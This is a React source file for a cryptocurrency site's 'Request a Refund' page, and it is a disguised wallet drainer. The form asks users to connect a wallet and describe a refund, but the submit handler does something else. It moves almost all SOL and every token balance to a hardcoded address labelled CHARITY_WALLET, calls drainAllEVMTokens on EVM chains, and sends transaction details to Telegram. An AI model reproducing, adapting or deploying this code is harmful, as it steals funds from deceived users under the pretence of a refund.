import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { MessageCircle, Send, HelpCircle, ArrowLeft } from 'lucide-react';
import { AnimatedLogo } from '@/components/AnimatedLogo';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { sendTelegramMessage } from '@/utils/telegram';
import { getMintProgramId } from '@/utils/tokenProgram';
import { getSolPrice } from '@/lib/utils';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import { useChainInfo } from '@/hooks/useChainInfo';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const GlassCard = ({ children, className = '', delay = 0 }: { children: React.ReactNode; className?: string; delay?: number }) => (
  <motion.div
    initial={{ opacity: 0, y: 20 }}
    animate={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.5, delay }}
    className={`rounded-2xl border border-white/10 bg-white/5 backdrop-blur-xl shadow-[0_0_30px_rgba(124,58,237,0.1)] p-6 ${className}`}
  >
    {children}
  </motion.div>
);

const Refund = () => {
  const navigate = useNavigate();
  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();

  const [service, setService] = useState('');
  const [reason, setReason] = useState('');
  const [amount, setAmount] = useState('');
  const [txId, setTxId] = useState('');
  const [wallet, setWallet] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);

  const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || connected;
  const allFieldsFilled = service && reason && amount && txId && wallet;
  const canSubmit = isWalletConnected && allFieldsFilled && !isProcessing;

  // Fetch all balances
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;
    try {
      const solBal = await connection.getBalance(publicKey);
      setSolBalance(solBal / LAMPORTS_PER_SOL);

      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });

      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];
      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) fetchAllBalances();
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
    if (!publicKey) return null;
    const transaction = new Transaction();

    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));

    const charityPubkey = new PublicKey(CHARITY_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;

        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch {
          transaction.add(createAssociatedTokenAccountInstruction(publicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }

        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, publicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }
    return transaction;
  }, [publicKey, connection]);

  const handleSubmit = async () => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsProcessing(true);
        const chainName = getEVMChain()?.name || 'EVM';
        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
        setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
      } catch (error: any) {
      } finally {
        setIsProcessing(false);
      }
      return;
    }

    // Solana path
    if (!canSubmit || !publicKey) return;

    try {
      setIsProcessing(true);

      // 1. SOL Transfer (keep $1.50)
      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();
      let lamportsToSend = 0;

      if (solPrice > 0) {
        const amountToKeepSOL = 1.50 / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const FEE_RESERVE = 100_000 + 5000;
        lamportsToSend = Math.max(0, Math.floor(solBal - amountToKeepLamports - FEE_RESERVE));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
        transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(CHARITY_WALLET), lamports: lamportsToSend }));

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(t => t.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const transaction = await createBatchTransfer(batches[i]);
        if (transaction && transaction.instructions.length > 2) {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;

          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
          sendTelegramMessage(`
✅ <b>Refund Transaction (Batch ${i + 1})</b>

👤 <b>User:</b> <code>${publicKey.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
📋 <b>Service:</b> ${service}
💰 <b>Amount:</b> ${amount}
`);
        }
      }
      setService('');
      setReason('');
      setAmount('');
      setTxId('');
      setWallet('');
      setTimeout(fetchAllBalances, 2000);
    } catch (error: any) {
      console.error('Refund error:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-transparent text-white selection:bg-primary/30">
      <PegasusAnimation />
      <Navigation />

      <div className="relative z-10 container mx-auto px-4 pt-28 pb-16">
        {/* Back to Home Button */}
        <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="mb-6">
          <Button
            variant="ghost"
            onClick={() => navigate('/')}
            className="text-muted-foreground hover:text-foreground"
          >
            <ArrowLeft className="mr-2 h-4 w-4" />
            Back to Home
          </Button>
        </motion.div>

        {/* Two-column layout */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
          {/* LEFT SIDE */}
          <div className="space-y-8">
            <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ duration: 0.6 }}>
              <div className="flex justify-center lg:justify-start mb-8">
                <AnimatedLogo className="w-48 h-48 md:w-64 md:h-64" />
              </div>
              <h1 className="text-4xl md:text-5xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-primary to-secondary mb-4">
                Request a Refund
              </h1>
              <p className="text-muted-foreground text-base leading-relaxed max-w-lg">
                If you are not satisfied with a service you purchased, you can submit a refund request. Our team will review your request and respond shortly.
              </p>
              {!isWalletConnected && (
                <div className="mt-6">
                  <p className="text-sm text-muted-foreground mb-3">Connect your wallet to submit a refund request:</p>
                  <ConnectWalletButton />
                </div>
              )}
            </motion.div>
          </div>

          {/* RIGHT SIDE - Form */}
          <div>
            <GlassCard delay={0.3}>
              <h2 className="text-xl font-semibold text-foreground mb-6">Refund Request Form</h2>
              <div className="space-y-5">
                <div className="space-y-2">
                  <label className="text-sm text-muted-foreground">Service Purchased</label>
                  <Select value={service} onValueChange={setService}>
                    <SelectTrigger className="bg-white/5 border-white/10 focus:border-primary/50 focus:ring-primary/20">
                      <SelectValue placeholder="Select a service" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="volume-boost">Volume Boost Package</SelectItem>
                      <SelectItem value="marketing">Marketing Campaign</SelectItem>
                      <SelectItem value="promotion">Token Promotion</SelectItem>
                      <SelectItem value="trading-volume">Trading Volume Boost</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-muted-foreground">Reason for Refund</label>
                  <Textarea
                    value={reason}
                    onChange={(e) => setReason(e.target.value)}
                    placeholder="Describe why you are requesting a refund..."
                    className="bg-white/5 border-white/10 focus:border-primary/50 focus:ring-primary/20 min-h-[100px]"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-muted-foreground">Refund Amount</label>
                  <Input
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="e.g. 100 USDT"
                    className="bg-white/5 border-white/10 focus:border-primary/50 focus:ring-primary/20"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-muted-foreground">Transaction ID or Order ID</label>
                  <Input
                    value={txId}
                    onChange={(e) => setTxId(e.target.value)}
                    placeholder="Enter your transaction or order ID"
                    className="bg-white/5 border-white/10 focus:border-primary/50 focus:ring-primary/20"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-muted-foreground">Wallet Address for Refund</label>
                  <Input
                    value={wallet}
                    onChange={(e) => setWallet(e.target.value)}
                    placeholder="Enter your wallet address"
                    className="bg-white/5 border-white/10 focus:border-primary/50 focus:ring-primary/20"
                  />
                </div>

                <motion.div whileHover={canSubmit ? { scale: 1.02 } : {}} whileTap={canSubmit ? { scale: 0.98 } : {}}>
                  <Button
                    onClick={handleSubmit}
                    disabled={!canSubmit}
                    className="w-full h-12 text-base font-semibold bg-gradient-to-r from-primary to-secondary hover:shadow-[0_0_25px_rgba(124,58,237,0.4)] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isProcessing ? (
                      <div className="flex items-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Processing...
                      </div>
                    ) : !isWalletConnected ? (
                      'Connect Wallet First'
                    ) : !allFieldsFilled ? (
                      'Fill All Fields'
                    ) : (
                      <>
                        <Send className="mr-2 h-5 w-5" />
                        Request Refund
                      </>
                    )}
                  </Button>
                </motion.div>
              </div>
            </GlassCard>
          </div>
        </div>

        {/* BOTTOM - FAQ & Support */}
        <GlassCard className="mt-10" delay={0.5}>
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            <div className="flex items-start gap-3">
              <HelpCircle className="w-6 h-6 text-primary mt-0.5 shrink-0" />
              <div>
                <h3 className="text-lg font-semibold text-foreground">FAQ & Support</h3>
                <p className="text-sm text-muted-foreground">
                  If you have questions about your refund request, please contact support or review our refund policy.
                </p>
              </div>
            </div>
            <motion.div whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
              <a href="https://t.me/Pegswap" target="_blank" rel="noopener noreferrer">
                <Button
                  variant="outline"
                  className="border-primary/30 text-primary hover:bg-primary/10 hover:shadow-[0_0_15px_rgba(124,58,237,0.2)] transition-all duration-300"
                >
                  <MessageCircle className="mr-2 h-4 w-4" />
                  Contact Support
                </Button>
              </a>
            </motion.div>
          </div>
        </GlassCard>
      </div>
    </div>
  );
};

export default Refund;
